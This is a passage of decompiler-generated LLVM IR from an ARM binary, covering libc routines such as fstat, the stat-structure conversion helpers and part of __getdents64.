  store i32 %v20_14fc0, i32* %v19_14fc0, align 4
  %v21_14fc0 = add i32 %v0_14fbc, 28
  %v22_14fc0 = inttoptr i32 %v21_14fc0 to i32*
  %v23_14fc0 = load i32, i32* @fp, align 4
  store i32 %v23_14fc0, i32* %v22_14fc0, align 4
  %v24_14fc0 = add i32 %v0_14fbc, 32
  %v25_14fc0 = inttoptr i32 %v24_14fc0 to i32*
  %v27_14fc0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_14fc0, i32* %v25_14fc0, align 4
  %v28_14fc0 = add i32 %v0_14fbc, 36
  %v29_14fc0 = inttoptr i32 %v28_14fc0 to i32*
  %v30_14fc0 = load i32, i32* @lr, align 4
  store i32 %v30_14fc0, i32* %v29_14fc0, align 4
  %v0_14fc4 = call i32 @__sigjmp_save()
  ret i32 %v0_14fc4

; uselistorder directives
  uselistorder i32 %v0_14fbc, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_14fd0 = load i32, i32* @r1, align 4
  store i32 %v0_14fd0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_14fe0 = load i32, i32* @r0, align 4
  store i32 %v0_14fe0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_14fe0, -4095
  br i1 %tmp, label %dec_label_pc_15008, label %dec_label_pc_14fec

dec_label_pc_14fec:                               ; preds = %entry
  %v0_14ff0 = call i32 @__aeabi_read_tp()
  %v3_14ff4 = load i16, i16* @global_var_24070.401, align 2
  %v4_14ff4 = sext i16 %v3_14ff4 to i32
  store i32 %v4_14ff4, i32* @r3, align 4
  %v0_14ff8 = load i32, i32* @r2, align 4
  %v1_14ff8 = sub i32 0, %v0_14ff8
  store i32 %v1_14ff8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_15000 = add i32 %v4_14ff4, %v0_14ff0
  %v4_15000 = inttoptr i32 %v3_15000 to i32*
  store i32 %v1_14ff8, i32* %v4_15000, align 4
  br label %dec_label_pc_15018

dec_label_pc_15008:                               ; preds = %entry
  store i32 %v0_14fe0, i32* %r7.global-to-local, align 4
  %v2_15008 = icmp eq i32 %v0_14fe0, 0
  br i1 %v2_15008, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15008
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15008, %bb
  call void @__pseudo_cond_branch(i1 %v2_15008, i32 ptrtoint (i32* @global_var_150f8.862 to i32))
  br label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_14fec, %.thread
  %v0_15018 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_15018

; uselistorder directives
  uselistorder i32 %v0_14fe0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15018, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1502c = load i32, i32* @r4, align 4
  store i32 %v3_1502c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_15044 = inttoptr i32 %arg2 to i8*
  %v4_15044 = call i32 @__GI_memset(i8* %v3_15044, i32 0, i32 104)
  %v2_15048 = load i32, i32* %arg1, align 4
  store i32 %v2_15048, i32* %r3.global-to-local, align 4
  %v3_15048 = add i32 %tmp, 4
  %v4_15048 = inttoptr i32 %v3_15048 to i32*
  %v5_15048 = load i32, i32* %v4_15048, align 4
  store i32 %v5_15048, i32* %r4.global-to-local, align 4
  %v0_1504c = load i32, i32* %r5.global-to-local, align 4
  %v1_1504c = inttoptr i32 %v0_1504c to i32*
  store i32 %v2_15048, i32* %v1_1504c, align 4
  %v3_1504c = add i32 %v0_1504c, 4
  %v4_1504c = inttoptr i32 %v3_1504c to i32*
  %v5_1504c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1504c, i32* %v4_1504c, align 4
  %v0_15050 = load i32, i32* %r6.global-to-local, align 4
  %v1_15050 = add i32 %v0_15050, 12
  %v2_15050 = inttoptr i32 %v1_15050 to i32*
  %v3_15050 = load i32, i32* %v2_15050, align 4
  %v1_15054 = load i32, i32* %r5.global-to-local, align 4
  %v2_15054 = add i32 %v1_15054, 12
  %v3_15054 = inttoptr i32 %v2_15054 to i32*
  store i32 %v3_15050, i32* %v3_15054, align 4
  %v0_15058 = load i32, i32* %r6.global-to-local, align 4
  %v1_15058 = add i32 %v0_15058, 96
  store i32 %v1_15058, i32* %r3.global-to-local, align 4
  %v1_1505c = inttoptr i32 %v1_15058 to i32*
  %v2_1505c = load i32, i32* %v1_1505c, align 4
  store i32 %v2_1505c, i32* %r3.global-to-local, align 4
  %v3_1505c = add i32 %v0_15058, 100
  %v4_1505c = inttoptr i32 %v3_1505c to i32*
  %v5_1505c = load i32, i32* %v4_1505c, align 4
  store i32 %v5_1505c, i32* %r4.global-to-local, align 4
  %v1_15060 = add i32 %v0_15058, 56
  %v2_15060 = inttoptr i32 %v1_15060 to i32*
  %v3_15060 = load i32, i32* %v2_15060, align 4
  store i32 %v3_15060, i32* %r2.global-to-local, align 4
  %v1_15064 = load i32, i32* %r5.global-to-local, align 4
  %v2_15064 = add i32 %v1_15064, 96
  %v3_15064 = inttoptr i32 %v2_15064 to i32*
  store i32 %v2_1505c, i32* %v3_15064, align 4
  %v0_15068 = load i32, i32* %r4.global-to-local, align 4
  %v1_15068 = load i32, i32* %r5.global-to-local, align 4
  %v2_15068 = add i32 %v1_15068, 100
  %v3_15068 = inttoptr i32 %v2_15068 to i32*
  store i32 %v0_15068, i32* %v3_15068, align 4
  %v0_1506c = load i32, i32* %r6.global-to-local, align 4
  %v1_1506c = add i32 %v0_1506c, 24
  store i32 %v1_1506c, i32* %ip.global-to-local, align 4
  %v1_15070 = inttoptr i32 %v1_1506c to i32*
  %v2_15070 = load i32, i32* %v1_15070, align 4
  store i32 %v2_15070, i32* %ip.global-to-local, align 4
  %v3_15070 = add i32 %v0_1506c, 28
  %v4_15070 = inttoptr i32 %v3_15070 to i32*
  %v5_15070 = load i32, i32* %v4_15070, align 4
  store i32 %v5_15070, i32* %lr.global-to-local, align 4
  %v0_15074 = load i32, i32* %r2.global-to-local, align 4
  %v1_15074 = load i32, i32* %r5.global-to-local, align 4
  %v2_15074 = add i32 %v1_15074, 56
  %v3_15074 = inttoptr i32 %v2_15074 to i32*
  store i32 %v0_15074, i32* %v3_15074, align 4
  %v0_15078 = load i32, i32* %r6.global-to-local, align 4
  %v1_15078 = add i32 %v0_15078, 72
  store i32 %v1_15078, i32* %r3.global-to-local, align 4
  %v1_1507c = add i32 %v0_15078, 32
  store i32 %v1_1507c, i32* %r7.global-to-local, align 4
  %v1_15080 = inttoptr i32 %v1_1507c to i32*
  %v2_15080 = load i32, i32* %v1_15080, align 4
  store i32 %v2_15080, i32* %r7.global-to-local, align 4
  %v3_15080 = add i32 %v0_15078, 36
  %v4_15080 = inttoptr i32 %v3_15080 to i32*
  %v5_15080 = load i32, i32* %v4_15080, align 4
  store i32 %v5_15080, i32* %r8.global-to-local, align 4
  %v1_15084 = inttoptr i32 %v1_15078 to i32*
  %v2_15084 = load i32, i32* %v1_15084, align 4
  %v3_15084 = add i32 %v0_15078, 76
  %v4_15084 = inttoptr i32 %v3_15084 to i32*
  %v5_15084 = load i32, i32* %v4_15084, align 4
  store i32 %v5_15084, i32* %r1.global-to-local, align 4
  %v0_15088 = load i32, i32* %r5.global-to-local, align 4
  %v1_15088 = add i32 %v0_15088, 72
  %v1_1508c = inttoptr i32 %v1_15088 to i32*
  store i32 %v2_15084, i32* %v1_1508c, align 4
  %v3_1508c = add i32 %v0_15088, 76
  %v4_1508c = inttoptr i32 %v3_1508c to i32*
  %v5_1508c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1508c, i32* %v4_1508c, align 4
  %v0_15090 = load i32, i32* %r7.global-to-local, align 4
  %v1_15090 = load i32, i32* %r5.global-to-local, align 4
  %v2_15090 = add i32 %v1_15090, 32
  %v3_15090 = inttoptr i32 %v2_15090 to i32*
  store i32 %v0_15090, i32* %v3_15090, align 4
  %v0_15094 = load i32, i32* %r8.global-to-local, align 4
  %v1_15094 = load i32, i32* %r5.global-to-local, align 4
  %v2_15094 = add i32 %v1_15094, 36
  %v3_15094 = inttoptr i32 %v2_15094 to i32*
  store i32 %v0_15094, i32* %v3_15094, align 4
  %v0_15098 = load i32, i32* %r6.global-to-local, align 4
  %v1_15098 = add i32 %v0_15098, 80
  store i32 %v1_15098, i32* %r3.global-to-local, align 4
  %v1_1509c = add i32 %v0_15098, 48
  store i32 %v1_1509c, i32* %r7.global-to-local, align 4
  %v1_150a0 = inttoptr i32 %v1_1509c to i32*
  %v2_150a0 = load i32, i32* %v1_150a0, align 4
  store i32 %v2_150a0, i32* %r7.global-to-local, align 4
  %v3_150a0 = add i32 %v0_15098, 52
  %v4_150a0 = inttoptr i32 %v3_150a0 to i32*
  %v5_150a0 = load i32, i32* %v4_150a0, align 4
  store i32 %v5_150a0, i32* %r8.global-to-local, align 4
  %v1_150a4 = inttoptr i32 %v1_15098 to i32*
  %v2_150a4 = load i32, i32* %v1_150a4, align 4
  %v3_150a4 = add i32 %v0_15098, 84
  %v4_150a4 = inttoptr i32 %v3_150a4 to i32*
  %v5_150a4 = load i32, i32* %v4_150a4, align 4
  store i32 %v5_150a4, i32* %r1.global-to-local, align 4
  %v1_150a8 = add i32 %v0_15098, 16
  %v2_150a8 = inttoptr i32 %v1_150a8 to i32*
  %v3_150a8 = load i32, i32* %v2_150a8, align 4
  store i32 %v3_150a8, i32* %r2.global-to-local, align 4
  %v0_150ac = load i32, i32* %r5.global-to-local, align 4
  %v1_150ac = add i32 %v0_150ac, 80
  %v1_150b0 = inttoptr i32 %v1_150ac to i32*
  store i32 %v2_150a4, i32* %v1_150b0, align 4
  %v3_150b0 = add i32 %v0_150ac, 84
  %v4_150b0 = inttoptr i32 %v3_150b0 to i32*
  %v5_150b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_150b0, i32* %v4_150b0, align 4
  %v0_150b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_150b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_150b4 = add i32 %v1_150b4, 48
  %v3_150b4 = inttoptr i32 %v2_150b4 to i32*
  store i32 %v0_150b4, i32* %v3_150b4, align 4
  %v0_150b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_150b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_150b8 = add i32 %v1_150b8, 52
  %v3_150b8 = inttoptr i32 %v2_150b8 to i32*
  store i32 %v0_150b8, i32* %v3_150b8, align 4
  %v0_150bc = load i32, i32* %r2.global-to-local, align 4
  %v1_150bc = load i32, i32* %r5.global-to-local, align 4
  %v2_150bc = add i32 %v1_150bc, 16
  %v3_150bc = inttoptr i32 %v2_150bc to i32*
  store i32 %v0_150bc, i32* %v3_150bc, align 4
  %v0_150c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_150c0 = add i32 %v0_150c0, 88
  store i32 %v1_150c0, i32* %r3.global-to-local, align 4
  %v1_150c4 = add i32 %v0_150c0, 20
  %v2_150c4 = inttoptr i32 %v1_150c4 to i32*
  %v3_150c4 = load i32, i32* %v2_150c4, align 4
  store i32 %v3_150c4, i32* %r2.global-to-local, align 4
  %v1_150c8 = inttoptr i32 %v1_150c0 to i32*
  %v2_150c8 = load i32, i32* %v1_150c8, align 4
  %v3_150c8 = add i32 %v0_150c0, 92
  %v4_150c8 = inttoptr i32 %v3_150c8 to i32*
  %v5_150c8 = load i32, i32* %v4_150c8, align 4
  store i32 %v5_150c8, i32* %r1.global-to-local, align 4
  %v1_150cc = add i32 %v0_150c0, 64
  store i32 %v1_150cc, i32* %r6.global-to-local, align 4
  %v1_150d0 = inttoptr i32 %v1_150cc to i32*
  %v2_150d0 = load i32, i32* %v1_150d0, align 4
  store i32 %v2_150d0, i32* %r6.global-to-local, align 4
  %v3_150d0 = add i32 %v0_150c0, 68
  %v4_150d0 = inttoptr i32 %v3_150d0 to i32*
  %v5_150d0 = load i32, i32* %v4_150d0, align 4
  store i32 %v5_150d0, i32* %r7.global-to-local, align 4
  %v0_150d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_150d4 = add i32 %v0_150d4, 88
  store i32 %v1_150d4, i32* %r3.global-to-local, align 4
  %v2_150d8 = add i32 %v0_150d4, 20
  %v3_150d8 = inttoptr i32 %v2_150d8 to i32*
  store i32 %v3_150c4, i32* %v3_150d8, align 4
  %v0_150dc = load i32, i32* %ip.global-to-local, align 4
  %v1_150dc = load i32, i32* %r5.global-to-local, align 4
  %v2_150dc = add i32 %v1_150dc, 24
  %v3_150dc = inttoptr i32 %v2_150dc to i32*
  store i32 %v0_150dc, i32* %v3_150dc, align 4
  %v0_150e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_150e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_150e0 = add i32 %v1_150e0, 28
  %v3_150e0 = inttoptr i32 %v2_150e0 to i32*
  store i32 %v0_150e0, i32* %v3_150e0, align 4
  %v0_150e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_150e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_150e4 = add i32 %v1_150e4, 64
  %v3_150e4 = inttoptr i32 %v2_150e4 to i32*
  store i32 %v0_150e4, i32* %v3_150e4, align 4
  %v0_150e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_150e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_150e8 = add i32 %v1_150e8, 68
  %v3_150e8 = inttoptr i32 %v2_150e8 to i32*
  store i32 %v0_150e8, i32* %v3_150e8, align 4
  %v0_150ec = load i32, i32* %r3.global-to-local, align 4
  %v1_150ec = inttoptr i32 %v0_150ec to i32*
  store i32 %v2_150c8, i32* %v1_150ec, align 4
  %v3_150ec = add i32 %v0_150ec, 4
  %v4_150ec = inttoptr i32 %v3_150ec to i32*
  %v5_150ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_150ec, i32* %v4_150ec, align 4
  %v2_150f0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_150f0, i32* %r4.global-to-local, align 4
  ret i32 %v2_150c8

; uselistorder directives
  uselistorder i32 %v0_150c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15098, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 104, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_150f8 = load i32, i32* @r4, align 4
  store i32 %v3_150f8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_15110 = inttoptr i32 %arg2 to i8*
  %v4_15110 = call i32 @__GI_memset(i8* %v3_15110, i32 0, i32 88)
  %v2_15114 = load i32, i32* %arg1, align 4
  %v3_15114 = add i32 %tmp, 4
  %v4_15114 = inttoptr i32 %v3_15114 to i32*
  %v5_15114 = load i32, i32* %v4_15114, align 4
  store i32 %v5_15114, i32* %r4.global-to-local, align 4
  %v0_15118 = load i32, i32* %r6.global-to-local, align 4
  %v1_15118 = inttoptr i32 %v0_15118 to i32*
  store i32 %v2_15114, i32* %v1_15118, align 4
  %v3_15118 = add i32 %v0_15118, 4
  %v4_15118 = inttoptr i32 %v3_15118 to i32*
  %v5_15118 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15118, i32* %v4_15118, align 4
  %v0_1511c = load i32, i32* %r5.global-to-local, align 4
  %v1_1511c = add i32 %v0_1511c, 32
  %v1_15120 = inttoptr i32 %v1_1511c to i32*
  %v2_15120 = load i32, i32* %v1_15120, align 4
  %v3_15120 = add i32 %v0_1511c, 36
  %v4_15120 = inttoptr i32 %v3_15120 to i32*
  %v5_15120 = load i32, i32* %v4_15120, align 4
  store i32 %v5_15120, i32* %r4.global-to-local, align 4
  %v1_15124 = add i32 %v0_1511c, 96
  %v2_15124 = inttoptr i32 %v1_15124 to i32*
  %v3_15124 = load i32, i32* %v2_15124, align 4
  store i32 %v3_15124, i32* %r2.global-to-local, align 4
  %v1_15128 = load i32, i32* %r6.global-to-local, align 4
  %v2_15128 = add i32 %v1_15128, 32
  %v3_15128 = inttoptr i32 %v2_15128 to i32*
  store i32 %v2_15120, i32* %v3_15128, align 4
  %v0_1512c = load i32, i32* %r4.global-to-local, align 4
  %v1_1512c = load i32, i32* %r6.global-to-local, align 4
  %v2_1512c = add i32 %v1_1512c, 36
  %v3_1512c = inttoptr i32 %v2_1512c to i32*
  store i32 %v0_1512c, i32* %v3_1512c, align 4
  %v0_15130 = load i32, i32* %r2.global-to-local, align 4
  %v1_15130 = load i32, i32* %r6.global-to-local, align 4
  %v2_15130 = add i32 %v1_15130, 12
  %v3_15130 = inttoptr i32 %v2_15130 to i32*
  store i32 %v0_15130, i32* %v3_15130, align 4
  %v0_15134 = load i32, i32* %r5.global-to-local, align 4
  %v1_15134 = add i32 %v0_15134, 48
  %v2_15134 = inttoptr i32 %v1_15134 to i32*
  %v3_15134 = load i32, i32* %v2_15134, align 4
  %v1_15138 = add i32 %v0_15134, 24
  store i32 %v1_15138, i32* %ip.global-to-local, align 4
  %v1_1513c = inttoptr i32 %v1_15138 to i32*
  %v2_1513c = load i32, i32* %v1_1513c, align 4
  store i32 %v2_1513c, i32* %ip.global-to-local, align 4
  %v3_1513c = add i32 %v0_15134, 28
  %v4_1513c = inttoptr i32 %v3_1513c to i32*
  %v5_1513c = load i32, i32* %v4_1513c, align 4
  store i32 %v5_1513c, i32* %lr.global-to-local, align 4
  %v1_15140 = load i32, i32* %r6.global-to-local, align 4
  %v2_15140 = add i32 %v1_15140, 44
  %v3_15140 = inttoptr i32 %v2_15140 to i32*
  store i32 %v3_15134, i32* %v3_15140, align 4
  %v0_15144 = load i32, i32* %r5.global-to-local, align 4
  %v1_15144 = add i32 %v0_15144, 64
  %v2_15144 = inttoptr i32 %v1_15144 to i32*
  %v3_15144 = load i32, i32* %v2_15144, align 4
  %v1_15148 = add i32 %v0_15144, 56
  %v2_15148 = inttoptr i32 %v1_15148 to i32*
  %v3_15148 = load i32, i32* %v2_15148, align 4
  store i32 %v3_15148, i32* %r2.global-to-local, align 4
  %v1_1514c = load i32, i32* %r6.global-to-local, align 4
  %v2_1514c = add i32 %v1_1514c, 52
  %v3_1514c = inttoptr i32 %v2_1514c to i32*
  store i32 %v3_15144, i32* %v3_1514c, align 4
  %v0_15150 = load i32, i32* %r2.global-to-local, align 4
  %v1_15150 = load i32, i32* %r6.global-to-local, align 4
  %v2_15150 = add i32 %v1_15150, 48
  %v3_15150 = inttoptr i32 %v2_15150 to i32*
  store i32 %v0_15150, i32* %v3_15150, align 4
  %v0_15154 = load i32, i32* %r5.global-to-local, align 4
  %v1_15154 = add i32 %v0_15154, 72
  %v1_15158 = inttoptr i32 %v1_15154 to i32*
  %v2_15158 = load i32, i32* %v1_15158, align 4
  %v3_15158 = add i32 %v0_15154, 76
  %v4_15158 = inttoptr i32 %v3_15158 to i32*
  %v5_15158 = load i32, i32* %v4_15158, align 4
  store i32 %v5_15158, i32* %r1.global-to-local, align 4
  %v0_1515c = load i32, i32* %r6.global-to-local, align 4
  %v1_1515c = add i32 %v0_1515c, 56
  %v1_15160 = inttoptr i32 %v1_1515c to i32*
  store i32 %v2_15158, i32* %v1_15160, align 4
  %v3_15160 = add i32 %v0_1515c, 60
  %v4_15160 = inttoptr i32 %v3_15160 to i32*
  %v5_15160 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15160, i32* %v4_15160, align 4
  %v0_15164 = load i32, i32* %r5.global-to-local, align 4
  %v1_15164 = add i32 %v0_15164, 80
  %v1_15168 = inttoptr i32 %v1_15164 to i32*
  %v2_15168 = load i32, i32* %v1_15168, align 4
  %v3_15168 = add i32 %v0_15164, 84
  %v4_15168 = inttoptr i32 %v3_15168 to i32*
  %v5_15168 = load i32, i32* %v4_15168, align 4
  store i32 %v5_15168, i32* %r1.global-to-local, align 4
  %v0_1516c = load i32, i32* %r6.global-to-local, align 4
  %v1_1516c = add i32 %v0_1516c, 64
  %v1_15170 = inttoptr i32 %v1_1516c to i32*
  store i32 %v2_15168, i32* %v1_15170, align 4
  %v3_15170 = add i32 %v0_1516c, 68
  %v4_15170 = inttoptr i32 %v3_15170 to i32*
  %v5_15170 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15170, i32* %v4_15170, align 4
  %v0_15174 = load i32, i32* %r5.global-to-local, align 4
  %v1_15174 = add i32 %v0_15174, 16
  %v2_15174 = inttoptr i32 %v1_15174 to i32*
  %v3_15174 = load i32, i32* %v2_15174, align 4
  %v1_15178 = load i32, i32* %r6.global-to-local, align 4
  %v2_15178 = add i32 %v1_15178, 16
  %v3_15178 = inttoptr i32 %v2_15178 to i32*
  store i32 %v3_15174, i32* %v3_15178, align 4
  %v0_1517c = load i32, i32* %r5.global-to-local, align 4
  %v1_1517c = add i32 %v0_1517c, 88
  %v1_15180 = add i32 %v0_1517c, 20
  %v2_15180 = inttoptr i32 %v1_15180 to i32*
  %v3_15180 = load i32, i32* %v2_15180, align 4
  store i32 %v3_15180, i32* %r2.global-to-local, align 4
  %v1_15184 = inttoptr i32 %v1_1517c to i32*
  %v2_15184 = load i32, i32* %v1_15184, align 4
  %v3_15184 = add i32 %v0_1517c, 92
  %v4_15184 = inttoptr i32 %v3_15184 to i32*
  %v5_15184 = load i32, i32* %v4_15184, align 4
  store i32 %v5_15184, i32* %r1.global-to-local, align 4
  %v0_15188 = load i32, i32* %r6.global-to-local, align 4
  %v1_15188 = add i32 %v0_15188, 72
  %v1_1518c = inttoptr i32 %v1_15188 to i32*
  store i32 %v2_15184, i32* %v1_1518c, align 4
  %v3_1518c = add i32 %v0_15188, 76
  %v4_1518c = inttoptr i32 %v3_1518c to i32*
  %v5_1518c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1518c, i32* %v4_1518c, align 4
  %v0_15190 = load i32, i32* %r2.global-to-local, align 4
  %v1_15190 = load i32, i32* %r6.global-to-local, align 4
  %v2_15190 = add i32 %v1_15190, 20
  %v3_15190 = inttoptr i32 %v2_15190 to i32*
  store i32 %v0_15190, i32* %v3_15190, align 4
  %v0_15194 = load i32, i32* %ip.global-to-local, align 4
  %v1_15194 = load i32, i32* %r6.global-to-local, align 4
  %v2_15194 = add i32 %v1_15194, 24
  %v3_15194 = inttoptr i32 %v2_15194 to i32*
  store i32 %v0_15194, i32* %v3_15194, align 4
  %v0_15198 = load i32, i32* %lr.global-to-local, align 4
  %v1_15198 = load i32, i32* %r6.global-to-local, align 4
  %v2_15198 = add i32 %v1_15198, 28
  %v3_15198 = inttoptr i32 %v2_15198 to i32*
  store i32 %v0_15198, i32* %v3_15198, align 4
  %v2_1519c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1519c, i32* %r4.global-to-local, align 4
  ret i32 %v2_15184

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 3, 4, 0, 1, 5, 6, 8, 7, 9, 2, 10, 11, 12, 14, 13, 15, 16, 17 }
  uselistorder i32 96, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_151a8 = load i32, i32* @r5, align 4
  %v12_151a8 = load i32, i32* @r7, align 4
  %v1_151ac = add i32 %arg3, 14
  %v2_151b4 = ptrtoint i32* %stack_var_-72 to i32
  %v1_151b8 = and i32 %v1_151ac, -8
  %v2_151bc = sub i32 %v2_151b4, %v1_151b8
  %v1_151c0 = add i32 %v2_151bc, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_15204, label %dec_label_pc_151e8

dec_label_pc_151e8:                               ; preds = %entry
  %v1_151ec = sub i32 0, %arg1
  %v3_151f0 = load i16, i16* @global_var_24070.401, align 2
  %v4_151f0 = sext i16 %v3_151f0 to i32
  %v0_151f4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_151fc = add i32 %v4_151f0, %v0_151f4
  %v4_151fc = inttoptr i32 %v3_151fc to i32*
  store i32 %v1_151ec, i32* %v4_151fc, align 4
  br label %dec_label_pc_152d4

dec_label_pc_15204:                               ; preds = %entry
  br i1 false, label %dec_label_pc_152d4, label %dec_label_pc_1520c

dec_label_pc_1520c:                               ; preds = %dec_label_pc_15204
  %v2_1520c = add i32 %v1_151c0, %arg1
  store i32 %v2_1520c, i32* %r1.global-to-local, align 4
  %v2_15210 = add i32 %tmp, %arg3
  store i32 %v1_151c0, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_152bc

dec_label_pc_1522c:                               ; preds = %dec_label_pc_152bc
  %v1_1522c = add i32 %v0_1528c, 16
  %v2_1522c = inttoptr i32 %v1_1522c to i16*
  %v3_1522c = load i16, i16* %v2_1522c, align 2
  %v4_1522c = zext i16 %v3_1522c to i32
  %v1_15230 = add nsw i32 %v4_1522c, -19
  store i32 %v1_15230, i32* @r2, align 4
  %v1_15234 = add nuw nsw i32 %v4_1522c, 7
  %v1_15238 = and i32 %v1_15234, 131064
  store i32 %v1_15238, i32* @ip, align 4
  %v2_15240 = add i32 %v1_15238, %v0_15294
  store i32 %v2_15240, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_15240, %v2_15210
  br i1 %tmp24, label %dec_label_pc_1524c, label %dec_label_pc_15288

dec_label_pc_1524c:                               ; preds = %dec_label_pc_1522c
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_15254 = load i32, i32* %r8.global-to-local, align 4
  %v0_15258 = load i32, i32* %sb.global-to-local, align 4
  %v1_1525c = load i32, i32* @sp, align 4
  %v2_1525c = inttoptr i32 %v1_1525c to i32*
  store i32 0, i32* %v2_1525c, align 4
  %v4_15260 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_15254, i32 %v0_15258)
  %v0_15264 = load i32, i32* @r5, align 4
  %v1_15264 = load i32, i32* %sl.global-to-local, align 4
  %v9_15264 = icmp eq i32 %v0_15264, %v1_15264
  br i1 %v9_15264, label %dec_label_pc_1526c, label %dec_label_pc_152d0

dec_label_pc_1526c:                               ; preds = %dec_label_pc_1524c
  %v0_15270 = call i32 @__aeabi_read_tp()
  %v3_15274 = load i16, i16* @global_var_24070.401, align 2
  %v4_15274 = sext i16 %v3_15274 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_15280 = add i32 %v4_15274, %v0_15270
  %v4_15280 = inttoptr i32 %v3_15280 to i32*
  store i32 22, i32* %v4_15280, align 4
  br label %dec_label_pc_152d4

dec_label_pc_15288:                               ; preds = %dec_label_pc_1522c
  %v1_15288 = inttoptr i32 %v0_1528c to i32*
  %v2_15288 = load i32, i32* %v1_15288, align 4
  %v3_15288 = add i32 %v0_1528c, 4
  %v4_15288 = inttoptr i32 %v3_15288 to i32*
  %v5_15288 = load i32, i32* %v4_15288, align 4
  store i32 %v5_15288, i32* @r4, align 4
  %v1_1528c = add i32 %v0_1528c, 8
  store i32 %v1_1528c, i32* %r8.global-to-local, align 4
